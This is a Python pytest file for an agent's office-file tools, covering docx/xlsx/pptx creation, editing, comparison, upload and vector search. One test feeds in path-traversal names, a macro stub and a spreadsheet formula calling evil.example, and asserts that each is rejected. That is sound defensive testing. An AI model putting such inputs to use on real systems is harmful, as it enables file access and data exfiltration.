import base64
import io
import zipfile

import pytest
from fastapi.testclient import TestClient
from superagent.integrations.office import create_bytes,edit_bytes,extract,run_office
from superagent.integrations.office_files import OfficeFiles,check_package
from superagent.integrations.knowledge import Knowledge
from superagent.web.app import create_app


@pytest.mark.parametrize('extension,content,changes,expected',[
 ('docx',{'title':'Договор','blocks':[{'type':'paragraph','text':'Цена 100 рублей'},{'type':'table','rows':[['Предмет','Сумма'],['Услуга',100]]}]},{'replace':[{'old':'100','new':'150'}]},'150'),
 ('xlsx',{'sheets':[{'name':'Смета','rows':[['Статья','Сумма'],['Услуга',100],['Итого','=SUM(B2:B2)']]}]},{'cells':[{'sheet':'Смета','cell':'B2','value':150}]},150),
 ('pptx',{'slides':[{'title':'Отчёт','text':['Доход 100 рублей'],'notes':'Для обсуждения'}]},{'replace':[{'old':'100','new':'150'}]},'150'),
])
def test_office_create_edit_compare_keeps_source(platform,extension,content,changes,expected):
 original=run_office(platform.root,'office_create',{'format':extension,'name':'Исходник.'+extension,'content':content})['file']
 edited=run_office(platform.root,'office_edit',{'file_id':original['id'],'name':'Изменённый.'+extension,'changes':changes})['file']
 assert edited['source']==original['id'] and edited['id']!=original['id']
 result=run_office(platform.root,'office_compare',{'file_id':original['id'],'other_id':edited['id']})
 assert not result['equal'] and result['total_changes']>0 and not result['truncated']
 assert any(str(expected) in str(e['after']) for e in result['changes'])
 assert run_office(platform.root,'office_compare',{'file_id':original['id'],'other_id':original['id']})['equal']
 assert OfficeFiles(platform.root).read(original['id'])[1]!=OfficeFiles(platform.root).read(edited['id'])[1]


def test_office_cannot_access_another_root_and_rejects_active_content(platform,tmp_path):
 data=create_bytes('docx',{'blocks':[{'type':'paragraph','text':'Личный договор'}]})
 owner=OfficeFiles(platform.root);file=owner.save('Договор.docx',data)
 other=OfficeFiles(tmp_path/'other')
 with pytest.raises(ValueError):other.read(file['id'])
 with pytest.raises(ValueError):owner.read('../config.yaml')
 with pytest.raises(ValueError):owner.save('../bad.docx',data)
 with pytest.raises(ValueError):owner.save('bad.xlsx',data)
 bad=io.BytesIO()
 with zipfile.ZipFile(io.BytesIO(data)) as source,zipfile.ZipFile(bad,'w') as target:
  for item in source.infolist():target.writestr(item,source.read(item))
  target.writestr('word/vbaProject.bin',b'macro')
 with pytest.raises(ValueError):check_package(bad.getvalue(),'docx')
 with pytest.raises(ValueError):create_bytes('xlsx',{'sheets':[{'name':'Лист','rows':[['=WEBSERVICE("https://evil.example")']]}]})


def test_word_replacement_preserves_runs_and_replaces_all_matches():
 from docx import Document
 from superagent.integrations.office import replace_text
 d=Document();p=d.add_paragraph();p.add_run('При').bold=True;p.add_run('вет мир, Привет мир')
 assert replace_text(p,'Привет','Приветствую')==2
 assert p.text=='Приветствую мир, Приветствую мир' and p.runs[0].bold


def test_upload_download_and_chat_rejects_missing_attachment(platform):
 data=create_bytes('xlsx',{'sheets':[{'name':'Лист','rows':[['Тест',42]]}]})
 with TestClient(create_app(platform,authentication=False),base_url='http://localhost') as c:
  response=c.post('/api/files',json={'name':'Тест.xlsx','data':base64.b64encode(data).decode()})
  assert response.status_code==200
  file=response.json();assert c.get(file['url']).content==data
  assert c.get('/api/files/'+'a'*32+'/download').status_code==400
  assert c.post('/api/chat',json={'conversation':True,'message':'read','files':['a'*32]}).status_code==400


def test_vector_search_reindex_model_scope_and_user_isolation(platform,tmp_path,monkeypatch):
 cfg=platform.config;cfg.embeddings.enabled=True
 def vectors(config,texts):return [[1.,0.] if 'договор' in t.lower() else [0.,1.] for t in texts]
 monkeypatch.setattr('superagent.integrations.knowledge.embed',vectors)
 f=OfficeFiles(platform.root).save('Договор.docx',create_bytes('docx',{'blocks':[{'type':'paragraph','text':'Договор аренды. Цена 100 рублей.'}]}))
 store=Knowledge(platform.root)
 assert store.index(cfg,f['id'])['indexed']
 result=store.search(cfg,'договор',5)
 assert result['matches'][0]['file_id']==f['id'] and result['matches'][0]['score']==1
 assert store.index(cfg,f['id'])['chunks']==store.list()['documents'][0]['chunks']
 other=Knowledge(tmp_path/'other')
 assert other.search(cfg,'договор',5)['matches']==[]
 with pytest.raises(ValueError):other.index(cfg,f['id'])
 cfg.embeddings.model='different-model'
 assert store.search(cfg,'договор',5)['matches']==[]
 assert store.forget(f['id'])['file_preserved'] and OfficeFiles(platform.root).path(f['id']).exists()
